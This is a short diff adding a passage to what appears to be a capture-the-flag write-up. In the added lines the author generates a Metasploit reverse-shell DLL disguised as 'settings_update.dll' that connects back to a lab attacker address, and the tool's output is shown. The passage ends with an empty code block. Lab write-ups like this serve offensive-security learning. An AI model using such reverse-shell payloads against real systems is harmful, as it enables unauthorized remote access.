@@ -499,3 +499,19 @@ i686-w64-mingw32-g++ -shared -o settings_update.dll settings_update.cpp
 Ill just recompile the code to make the 32-bit DLL, then ill rezip it once again
 
 But there is still nothing, ill try just using a msfvenom DLL as well
+
+```python
+❯❯❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1337 -f dll -o settings_update.dll 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: settings_update.dll
+```
+
+Ill make the payload
+
+```python
+
+```
